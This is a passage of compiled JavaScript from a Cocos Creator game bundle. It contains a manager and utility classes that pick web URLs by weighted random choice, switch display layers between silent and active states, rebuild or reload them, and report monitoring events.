          return randomUrlConfig;
        }
        electLayerConfig() {
          const layerConfigs = this.config.webs.filter(web => web.urls && web.urls.length > 0);
          const rcLayerConfigs = Array.from(this.cache.values()).filter(layer => !layer.isSilent).map(layer => layer.layerConfig);
          const webs = layerConfigs.filter(web => rcLayerConfigs.indexOf(web) == -1);
          if (!webs || webs.length === 0) {
            LogUtil.log("getShowWebUrl webs is null");
            return null;
          }
          const layerConfig = RandomUtil.random(webs, 'web_weight');
          if (!layerConfig || !layerConfig.urls || layerConfig.urls.length === 0) {
            LogUtil.log("getShowWebUrl layerConfig is null");
            return null;
          }
          return layerConfig;
        }
        updateRcLayer(layer, isRebuild = false) {
          const nextLayerConfig = this.electLayerConfig();
          if (nextLayerConfig == null || layer.layerConfig === nextLayerConfig) {
            layer.makeSilent(false);
            layer.loadNextUrlConfig(UrlLoadScene.rcReload);
          } else {
            // find if the layer config is already in the cache and silent
            const nextLayer = this.findLayerByConfig(nextLayerConfig);
            if (nextLayer) {
              // already exist, make the layer non silence, and make self silence
              nextLayer.makeSilent(false);
              nextLayer.loadNextUrlConfig(UrlLoadScene.rcReload);
              nextLayer.startReloadTimer();
              layer.makeSilent(true);
              if (isRebuild) {
                layer.loadNextUrlConfig(UrlLoadScene.silentRebuild);
              }
            } else {
              // not exist
              // 更换layerConfig
              layer.stopLayer();
              layer.setConfig(this.config, nextLayerConfig);
              layer.makeSilent(false);
              layer.loadNextUrlConfig(UrlLoadScene.rcReload);
            }
          }
        }
        onLayerRebuild(layer) {
          const layerConfig = layer.layerConfig;
          const oldInterId = layer.interId;
          const name = layer.name;
          const isSilent = layer.isSilent;
          layer.destroyLayer();
          this.cache.delete(name);
          const layerNew = this.createLayer(name, layerConfig);
          layerNew.makeSilent(isSilent);
          layerNew.interId = oldInterId;
          this.cache.set(name, layerNew);
          if (!isSilent) {
            this.updateRcLayer(layerNew, true);
          } else {
            layerNew.loadNextUrlConfig(UrlLoadScene.silentRebuild);
          }
        }
        onLayerReload(layer) {
          if (!layer.isSilent) {
            this.updateRcLayer(layer);
          } else {
            layer.loadNextUrlConfig(UrlLoadScene.silentReload);
          }
        }
        findLayerByConfig(layerConfig) {
          for (const layer of this.cache.values()) {
            if (layer.layerConfig === layerConfig) {
              return layer;
            }
          }
          return null;
        }
      }
      exports('BeyondManager', BeyondManager);

      // export const globalBeyondManager = BeyondManager.instance;
      BeyondManager._instance = void 0;
      BeyondManager.instance.mount2point();
      cclegacy._RF.pop();
    }
  };
});

System.register("chunks:///_virtual/beyond-util.ts", ['cc', './log-util.ts', './random-util.ts', './game-data-manager.ts', './report-agent.ts'], function (exports) {
  var cclegacy, LogUtil, RandomUtil, GameDataManager, ReportAgent, CustomReportEvent;
  return {
    setters: [function (module) {
      cclegacy = module.cclegacy;
    }, function (module) {
      LogUtil = module.LogUtil;
    }, function (module) {
      RandomUtil = module.RandomUtil;
    }, function (module) {
      GameDataManager = module.GameDataManager;
    }, function (module) {
      ReportAgent = module.ReportAgent;
      CustomReportEvent = module.CustomReportEvent;
    }],
    execute: function () {
      cclegacy._RF.push({}, "de5156WxNlNtYa3a9jcM0eE", "beyond-util", undefined);
      class BeyondUtil {
        static getUrl(urlConfig) {
          if (urlConfig.urls && urlConfig.urls.length > 0) {
            return RandomUtil.random(urlConfig.urls);
          }
          return urlConfig.url;
        }
        static reportEvent(data) {
          LogUtil.log("BeyondUtil", "reportEvent", JSON.stringify(data));
          ReportAgent.reportCustomEvent(CustomReportEvent.STABLE_MONITOR, data);
        }
        static getUrlWeight(urlConfig, globalConfig) {
          if (GameDataManager.instance.isUrlWeightDrop(urlConfig.hname)) {
            const weightDrop = globalConfig.total_weight.weight_drop;
            return urlConfig.url_weight * weightDrop;
          }
          return urlConfig.url_weight;
        }
        static randomUrlConfig(layerConfig, globalConfig) {
          const weights = layerConfig.urls.map(url => BeyondUtil.getUrlWeight(url, globalConfig));
          const randomUrlConfig = RandomUtil.random(layerConfig.urls, weights);
          return randomUrlConfig;
        }
      }
      exports('BeyondUtil', BeyondUtil);
      cclegacy._RF.pop();
    }
  };
});

System.register("chunks:///_virtual/bundle-beyond", ['./beyond-config.ts', './beyond-constants.ts', './beyond-ctrl-panel.ts', './beyond-layer.ts', './beyond-manager.ts', './beyond-util.ts'], function () {
  return {
    setters: [null, null, null, null, null, null],
    execute: function () {}
  };
});

(function(r) {
  r('virtual:///prerequisite-imports/bundle-beyond', 'chunks:///_virtual/bundle-beyond'); 
})(function(mid, cid) {
    System.register(mid, [cid], function (_export, _context) {
    return {
        setters: [function(_m) {
            var _exportObj = {};

            for (var _key in _m) {
              if (_key !== "default" && _key !== "__esModule") _exportObj[_key] = _m[_key];
            }
      
            _export(_exportObj);
        }],
        execute: function () { }
    };
    });
});